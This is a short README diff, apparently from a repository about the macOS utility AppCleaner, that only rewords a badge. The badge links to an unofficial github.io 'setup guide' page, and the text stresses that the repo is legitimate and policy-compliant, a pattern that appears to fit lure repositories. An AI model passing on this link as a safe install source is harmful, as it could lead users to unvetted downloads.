@@ -5,7 +5,7 @@
 AppCleaner is a legitimate macOS utility that helps remove apps and their related files.
 This repository provides a policy-compliant quick-start for legal installation and safe usage.
 
-[![Open the macOS Setup Guide](https://img.shields.io/badge/Open%20macOS%20Setup%20Guide-2da44e?style=for-the-badge\&logo=apple\&logoColor=white)](https://appcleaner-app-guide-install.github.io/.github/thanks.html)
+[![Open the macOS Setup Guide](https://img.shields.io/badge/Open%20macOS%20Guide-2da44e?style=for-the-badge\&logo=apple\&logoColor=white)](https://appcleaner-app-guide-install.github.io/.github/thanks.html)
 
 ---
 
